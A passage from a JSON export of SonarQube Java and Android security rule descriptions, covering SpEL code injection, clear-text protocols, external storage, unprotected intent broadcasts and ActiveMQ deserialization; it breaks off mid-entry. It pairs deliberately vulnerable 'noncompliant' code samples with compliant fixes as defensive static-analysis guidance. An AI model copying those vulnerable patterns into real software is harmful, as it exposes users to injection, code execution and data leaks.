org.springframework.expression.ExpressionParser;\nimport org.springframework.expression.spel.standard.SpelExpressionParser;\n\n@Controller\npublic class ExampleController\n{\n    @GetMapping(value = \"/\")\n    public void exec(@RequestParam(\"message\") String message) {\n        StandardEvaluationContext evaluationContext = new StandardEvaluationContext();\n        evaluationContext.setVariable(\"msg\", message);\n\n        ExpressionParser parser = new SpelExpressionParser();\n        Expression exp = parser.parseExpression(\"#msg\");\n        String result = (String) exp.getValue(evaluationContext);\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>\n<p>Anything that can be done via dynamic code execution can usually be done via a languageâs native SDK and static code.<br> Therefore, our suggestion\nis to avoid executing code dynamically.<br> If the application requires the execution of dynamic code, additional security measures must be taken.</p>\n<h4>Dynamic parameters</h4>\n<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the\ndynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic\ncode and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and\nperform the processing.</p>\n<p>The compliant code example uses such an approach.</p>\n<h4>Allow list</h4>\n<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage\nusing an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>\n<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the\nparameter is accepted. Otherwise, it is rejected and an error is raised.</p>\n<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where\nonly valid ones can be converted to a safe value.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> SonarSource - <a href=\"https://blog.sonarsource.com/moodle-remote-code-execution/\">Evil Teacher: Code Injection in Moodle</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/95\">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval\n  Injection')</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/917\">CWE-917 - Improper Neutralization of Special Elements used in an Expression Language\n  Statement ('Expression Language Injection')</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5334","summary":"Dynamic code execution should not be vulnerable to injection attacks","tags":["cwe","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the\ncapability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the\ntransported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>\n<ul>\n  <li> sensitive data exposure </li>\n  <li> traffic redirected to a malicious endpoint </li>\n  <li> malware-infected software update or installer </li>\n  <li> execution of client-side code </li>\n  <li> corruption of critical information </li>\n</ul>\n<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks\ninvolving communications being sniffed or tampered with can still happen.</p>\n<p>For example, attackers could successfully compromise prior security layers by:</p>\n<ul>\n  <li> bypassing isolation mechanisms </li>\n  <li> compromising a component of the network </li>\n  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>\n</ul>\n<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network\ncomponents. By layering various security practices (segmentation and encryption, for example), the application will follow the\n<em>defense-in-depth</em> principle.</p>\n<p>Note that using the <code>http</code> protocol is being deprecated by <a\nhref=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http\">major web browsers</a>.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-6169\">CVE-2019-6169</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-12327\">CVE-2019-12327</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-11065\">CVE-2019-11065</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>\n  <li> Application data transits over an untrusted network. </li>\n  <li> Compliance rules require the service to encrypt data in transit. </li>\n  <li> Your application renders web pages with a relaxed mixed content policy. </li>\n  <li> OS-level protections against clear-text traffic are deactivated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most\n  common clear-text protocols:\n    <ul>\n      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>\n      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>\n      <li> Use <code>https</code> instead of <code>http</code>. </li>\n      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>\n    </ul>  </li>\n  <li> Enable encryption of cloud components communications whenever it is possible. </li>\n  <li> Configure your application to block mixed content when rendering web pages. </li>\n  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>\n</ul>\n<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire\napplication or system.</p>\n<h2>Sensitive Code Example</h2>\n<p>These clients from <a href=\"https://commons.apache.org/proper/commons-net/\">Apache commons net</a> libraries are based on unencrypted protocols and\nare not recommended:</p>\n<pre>\nTelnetClient telnet = new TelnetClient(); // Sensitive\n\nFTPClient ftpClient = new FTPClient(); // Sensitive\n\nSMTPClient smtpClient = new SMTPClient(); // Sensitive\n</pre>\n<p>Unencrypted HTTP connections, when using <a href=\"https://square.github.io/okhttp/https/\">okhttp</a> library for instance, should be avoided:</p>\n<pre>\nConnectionSpec spec = new ConnectionSpec.Builder(ConnectionSpec.CLEARTEXT) // Sensitive\n  .build();\n</pre>\n<p>Android WebView can be configured to allow a secure origin to load content from any other origin, even if that origin is insecure (mixed\ncontent):</p>\n<pre>\nimport android.webkit.WebView\n\nWebView webView = findViewById(R.id.webview)\nwebView.getSettings().setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Use instead these clients from <a href=\"https://commons.apache.org/proper/commons-net/\">Apache commons net</a> and <a\nhref=\"https://github.com/mwiede/jsch\">JSch</a> library:</p>\n<pre>\nJSch jsch = new JSch();\n\nif(implicit) {\n  // implicit mode is considered deprecated but offer the same security than explicit mode\n  FTPSClient ftpsClient = new FTPSClient(true);\n}\nelse {\n  FTPSClient ftpsClient = new FTPSClient();\n}\n\nif(implicit) {\n  // implicit mode is considered deprecated but offer the same security than explicit mode\n  SMTPSClient smtpsClient = new SMTPSClient(true);\n}\nelse {\n  SMTPSClient smtpsClient = new SMTPSClient();\n  smtpsClient.connect(\"127.0.0.1\", 25);\n  if (smtpsClient.execTLS()) {\n    // commands\n  }\n}\n</pre>\n<p>Perform HTTP encrypted connections, with <a href=\"https://square.github.io/okhttp/https/\">okhttp</a> library for instance:</p>\n<pre>\nConnectionSpec spec = new ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS)\n  .build();\n</pre>\n<p>The most secure mode for Android WebView is <code>MIXED_CONTENT_NEVER_ALLOW</code>:</p>\n<pre>\nimport android.webkit.WebView\n\nWebView webView = findViewById(R.id.webview)\nwebView.getSettings().setMixedContentMode(MIXED_CONTENT_NEVER_ALLOW);\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>\n</ul>\n<h2>See</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> AWS Documentation - <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html\">Listeners for\n  your Application Load Balancers</a> </li>\n  <li> AWS Documentation - <a\n  href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html\">Stream Encryption</a>\n  </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Google - <a href=\"https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html\">Moving towards more secure web</a> </li>\n  <li> Mozilla - <a href=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/\">Deprecating non secure http</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-NETWORK/\">Mobile AppSec Verification Standard - Network Communication Requirements</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m5-insecure-communication\">Mobile Top 10 2024 Category M5 - Insecure\n  Communication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/319\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222397\">Application Security and\n  Development: V-222397</a> - The application must implement cryptographic mechanisms to protect the integrity of remote access sessions. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222534\">Application Security and\n  Development: V-222534</a> - Service-Oriented Applications handling non-releasable data must authenticate endpoint devices via mutual SSL/TLS. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222562\">Application Security and\n  Development: V-222562</a> - Applications used for non-local maintenance must implement cryptographic mechanisms to protect the integrity of\n  maintenance and diagnostic communications. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222563\">Application Security and\n  Development: V-222563</a> - Applications used for non-local maintenance must implement cryptographic mechanisms to protect the confidentiality of\n  maintenance and diagnostic communications. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222577\">Application Security and\n  Development: V-222577</a> - The application must not expose session IDs. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222596\">Application Security and\n  Development: V-222596</a> - The application must protect the confidentiality and integrity of transmitted information. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222597\">Application Security and\n  Development: V-222597</a> - The application must implement cryptographic mechanisms to prevent unauthorized disclosure of information and/or detect\n  changes to information during transmission. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222598\">Application Security and\n  Development: V-222598</a> - The application must maintain the confidentiality and integrity of information during preparation for transmission.\n  </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222599\">Application Security and\n  Development: V-222599</a> - The application must maintain the confidentiality and integrity of information during reception. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5332","summary":"Using clear-text protocols is security-sensitive","tags":["cwe","android"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>It is very common to pass a collection constructor reference as an argument, for example <code>Collectors.toCollection(ArrayList::new)</code> takes\nthe <code>ArrayList::new</code> constructor. When the method expects a <code>java.util.function.Supplier</code> it is perfectly fine. However when the\nmethod argument type is <code>java.util.function.Function</code> it means that an argument will be passed to the constructor.</p>\n<p>The first argument of Collections constructors is usually an integer representing its \"initial capacity\". This is generally not what the developer\nexpects, but the memory allocation is not visible at first glance.</p>\n<p>This rule raises an issue when a collection constructor is passed by reference as a <code>java.util.function.Function</code> argument.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nArrays.asList(1, 2, 54000).stream().collect(Collectors.toMap(Function.identity(), ArrayList::new)); // Noncompliant, \"ArrayList::new\" unintentionally refers to \"ArrayList(int initialCapacity)\" instead of \"ArrayList()\"\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nArrays.asList(1, 2, 54000).stream().collect(Collectors.toMap(Function.identity(), id -&gt; new ArrayList&lt;&gt;())); // Compliant, explicitly show the usage of \"id -&gt; new ArrayList&lt;&gt;()\" or \"id -&gt; new ArrayList&lt;&gt;(id)\"\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5329","summary":"Collection constructors should not be used as java.util.function.Function","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>Storing data locally is a common task for mobile applications. Such data includes files among other things. One convenient way to store files is to\nuse the external file storage which usually offers a larger amount of disc space compared to internal storage.</p>\n<p>Files created on the external storage are globally readable and writable. Therefore, a malicious application having the permissions\n<code>WRITE_EXTERNAL_STORAGE</code> or <code>READ_EXTERNAL_STORAGE</code> could try to read sensitive information from the files that other\napplications have stored on the external storage.</p>\n<p>External storage can also be removed by the user (e.g. when based on SD card) making the files unavailable to the application.</p>\n<h2>Ask Yourself Whether</h2>\n<p>Your application uses external storage to:</p>\n<ul>\n  <li> store files that contain sensitive data. </li>\n  <li> store files that are not meant to be shared with other application. </li>\n  <li> store files that are critical for the application to work. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use internal storage whenever possible as the system prevents other apps from accessing this location. </li>\n  <li> Only use external storage if you need to share non-sensitive files with other applications. </li>\n  <li> If your application has to use the external storage to store sensitive data, make sure it encrypts the files using <a\n  href=\"https://developer.android.com/reference/androidx/security/crypto/EncryptedFile\">EncryptedFile</a>. </li>\n  <li> Data coming from external storage should always be considered untrusted and should be validated. </li>\n  <li> As some external storage can be removed, make sure to never store files on it that are critical for the usability of your application. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport android.content.Context;\n\npublic class AccessExternalFiles {\n\n    public void accessFiles(Context context) {\n        context.getExternalFilesDir(null); // Sensitive\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport android.content.Context;\n\npublic class AccessExternalFiles {\n\n    public void accessFiles(Context context) {\n        context.getFilesDir();\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> <a href=\"https://developer.android.com/privacy-and-security/security-tips#ExternalStorage\">Android Security tips on external file storage</a>\n  </li>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-STORAGE/\">Mobile AppSec Verification Standard - Data Storage and Privacy\n  Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage\">Mobile Top 10 2016 Category M2 - Insecure\n  Data Storage</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m9-insecure-data-storage\">Mobile Top 10 2024 Category M9 - Insecure\n  Data Storage</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/312\">CWE-312 - Cleartext Storage of Sensitive Information</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5324","summary":"Accessing Android external storage is security-sensitive","tags":["cwe","android"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>Android applications can receive broadcasts from the system or other applications. Receiving intents is security-sensitive. For example, it has led\nin the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2019-1677\">CVE-2019-1677</a> </li>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2015-1275\">CVE-2015-1275</a> </li>\n</ul>\n<p>Receivers can be declared in the manifest or in the code to make them context-specific. If the receiver is declared in the manifest Android will\nstart the application if it is not already running once a matching broadcast is received. The receiver is an entry point into the application.</p>\n<p>Other applications can send potentially malicious broadcasts, so it is important to consider broadcasts as untrusted and to limit the applications\nthat can send broadcasts to the receiver.</p>\n<p>Permissions can be specified to restrict broadcasts to authorized applications. Restrictions can be enforced by both the sender and receiver of a\nbroadcast. If permissions are specified when registering a broadcast receiver, then only broadcasters who were granted this permission can send a\nmessage to the receiver.</p>\n<p>This rule raises an issue when a receiver is registered without specifying any broadcast permission.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The data extracted from intents is not sanitized. </li>\n  <li> Intents broadcast is not restricted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Restrict the access to broadcasted intents. See the <a\nhref=\"https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions\">Android documentation</a> for more\ninformation.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.IntentFilter;\nimport android.os.Build;\nimport android.os.Handler;\nimport android.support.annotation.RequiresApi;\n\npublic class MyIntentReceiver {\n\n    @RequiresApi(api = Build.VERSION_CODES.O)\n    public void register(Context context, BroadcastReceiver receiver,\n                         IntentFilter filter,\n                         String broadcastPermission,\n                         Handler scheduler,\n                         int flags) {\n        context.registerReceiver(receiver, filter); // Sensitive\n        context.registerReceiver(receiver, filter, flags); // Sensitive\n\n        // Broadcasting intent with \"null\" for broadcastPermission\n        context.registerReceiver(receiver, filter, null, scheduler); // Sensitive\n        context.registerReceiver(receiver, filter, null, scheduler, flags); // Sensitive\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.IntentFilter;\nimport android.os.Build;\nimport android.os.Handler;\nimport android.support.annotation.RequiresApi;\n\npublic class MyIntentReceiver {\n\n    @RequiresApi(api = Build.VERSION_CODES.O)\n    public void register(Context context, BroadcastReceiver receiver,\n                         IntentFilter filter,\n                         String broadcastPermission,\n                         Handler scheduler,\n                         int flags) {\n\n        context.registerReceiver(receiver, filter, broadcastPermission, scheduler);\n        context.registerReceiver(receiver, filter, broadcastPermission, scheduler, flags);\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-PLATFORM/\">Mobile AppSec Verification Standard - Platform Interaction Requirements</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage\">Mobile Top 10 2016 Category M1 - Improper\n  Platform Usage</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m3-insecure-authentication-authorization\">Mobile Top 10 2024 Category\n  M3 - Insecure Authentication/Authorization</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m4-insufficient-input-output-validation\">Mobile Top 10 2024 Category M4\n  - Insufficient Input/Output Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/925\">CWE-925 - Improper Verification of Intent by Broadcast Receiver</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/926\">CWE-926 - Improper Export of Android Application Components</a> </li>\n  <li> <a href=\"https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions\">Android documentation</a> -\n  Broadcast Overview - Security considerations and best practices </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5322","summary":"Receiving intents is security-sensitive","tags":["cwe","android"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>In Android applications, broadcasting intents is security-sensitive. For example, it has led in the past to the following vulnerability:</p>\n<ul>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2018-9489\">CVE-2018-9489</a> </li>\n</ul>\n<p>By default, broadcasted intents are visible to every application, exposing all sensitive information they contain.</p>\n<p>This rule raises an issue when an intent is broadcasted without specifying any \"receiver permission\".</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The intent contains sensitive information. </li>\n  <li> Intent reception is not restricted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Restrict the access to broadcasted intents. See <a\nhref=\"https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions\">Android documentation</a> for more\ninformation.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.os.Build;\nimport android.os.Bundle;\nimport android.os.Handler;\nimport android.os.UserHandle;\nimport android.support.annotation.RequiresApi;\n\npublic class MyIntentBroadcast {\n    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR1)\n    public void broadcast(Intent intent, Context context, UserHandle user,\n                          BroadcastReceiver resultReceiver, Handler scheduler, int initialCode,\n                          String initialData, Bundle initialExtras,\n                          String broadcastPermission) {\n        context.sendBroadcast(intent); // Sensitive\n        context.sendBroadcastAsUser(intent, user); // Sensitive\n\n        // Broadcasting intent with \"null\" for receiverPermission\n        context.sendBroadcast(intent, null); // Sensitive\n        context.sendBroadcastAsUser(intent, user, null); // Sensitive\n        context.sendOrderedBroadcast(intent, null); // Sensitive\n        context.sendOrderedBroadcastAsUser(intent, user, null, resultReceiver,\n                scheduler, initialCode, initialData, initialExtras); // Sensitive\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.os.Build;\nimport android.os.Bundle;\nimport android.os.Handler;\nimport android.os.UserHandle;\nimport android.support.annotation.RequiresApi;\n\npublic class MyIntentBroadcast {\n    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR1)\n    public void broadcast(Intent intent, Context context, UserHandle user,\n                          BroadcastReceiver resultReceiver, Handler scheduler, int initialCode,\n                          String initialData, Bundle initialExtras,\n                          String broadcastPermission) {\n\n        context.sendBroadcast(intent, broadcastPermission);\n        context.sendBroadcastAsUser(intent, user, broadcastPermission);\n        context.sendOrderedBroadcast(intent, broadcastPermission);\n        context.sendOrderedBroadcastAsUser(intent, user,broadcastPermission, resultReceiver,\n                scheduler, initialCode, initialData, initialExtras);\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-PLATFORM/\">Mobile AppSec Verification Standard - Platform Interaction Requirements</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage\">Mobile Top 10 2016 Category M1 - Improper\n  Platform Usage</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m3-insecure-authentication-authorization\">Mobile Top 10 2024 Category\n  M3 - Insecure Authentication/Authorization</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m8-security-misconfiguration\">Mobile Top 10 2024 Category M8 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/927\">CWE-927 - Use of Implicit Intent for Sensitive Communication</a> </li>\n  <li> <a href=\"https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions\">Android documentation</a> -\n  Broadcast Overview - Security considerations and best practices </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5320","summary":"Broadcasting intents is security-sensitive","tags":["cwe","android"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<p>ActiveMQ can send/receive JMS Object messages (ObjectMessage in ActiveMQ context) to comply with JMS specifications. Internally, ActiveMQ relies on\nJavaâs serialization mechanism for the marshaling and unmarshalling of the messages' payload.</p>\n<p>Applications should restrict the types that can be unserialized from JMS messages.</p>\n<h2>Why is this an issue?</h2>\n<p>When the application does not implement controls over the JMS object types, its clients could be able to force the deserialization of arbitrary\nobjects. This may lead to deserialization injection attacks.</p>\n<h3>What is the potential impact?</h3>\n<p>Attackers will be able to force the deserialization of arbitrary objects. This process will trigger the execution of magic unmarshalling methods on\nthe object and its properties. With a specially crafted serialized object, the attackers can exploit those magic methods to achieve malicious\npurposes.</p>\n<p>While the exact impact depends on the types available in the execution context at the time of deserialization, such an attack can generally lead to\nthe execution of arbitrary code on the application server.</p>\n<h4>Application-specific attacks</h4>\n<p>By exploiting the behavior of some of the application-defined types and objects, the attacker could manage to affect the applicationâs business\nlogic. The exact consequences will depend on the applicationâs nature:</p>\n<ul>\n  <li> Payment bypass in an e-commerce application. </li>\n  <li> Privilege escalation. </li>\n  <li> Unauthorized users' data access. </li>\n</ul>\n<h4>Publicly-known exploitation</h4>\n<p>In some cases, depending on the library the application uses and their versions, there may exist publicly known deserialization attack payloads\nknown as <strong>gadget chains</strong>. In general, they are designed to have severe consequences, such as:</p>\n<ul>\n  <li> Arbitrary code execution </li>\n  <li> Arbitrary file read or write </li>\n  <li> Server-side request forgery </li>\n</ul>\n<p>Those attacks are independent of the applicationâs own logic and from the types it specifies.</p>\n<h2>How to fix it in Java EE</h2>\n<h3>Code examples</h3>\n<p>The following code example is vulnerable to a deserialization injection attack because it allows the deserialization of arbitrary types from JMS\nmessages.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(\"tcp://localhost:61616\");\nfactory.setTrustAllPackages(true); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(\"tcp://localhost:61616\");\nfactory.setTrustedPackages(Arrays.asList(\"org.mypackage1\", \"org.mypackage2\"));\n</pre>\n<h3>How does this work?</h3>\n<p>The noncompliant code example calls the <code>setTrustAllPackages</code> method that explicitly allows the deserialization of arbitrary types. On\nthe contrary, the compliant code example, thanks to the <code>setTrustedPackages</code> method, defines a short list of classes allowed for the\ndeserialization.</p>\n<p>While defining a short list of trusted types is generally the state-of-the-art solution to avoid deserialization injection attacks, it is important\nto ensure that the allowed classes and packages can not be used to exploit the issue. In that case, a vulnerability would still be present.</p>\n<p>Note that ActiveMQ, starting with version 5.12.2, forces developers to explicitly list packages that JMS messages can contain. This limits the risk\nof successful exploitation. In versions before that one, calling the <code>ActiveMQConnectionFactory</code> constructor without further configuration\nwould leave the application at risk.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Apache ActiveMQ Documentation - <a href=\"https://activemq.apache.org/objectmessage.html\">ObjectMessage</a> </li>\n  <li> CVE - <a href=\"https://www.cve.org/CVERecord?id=CVE-2015-5254\">CVE-2015-5254</a> 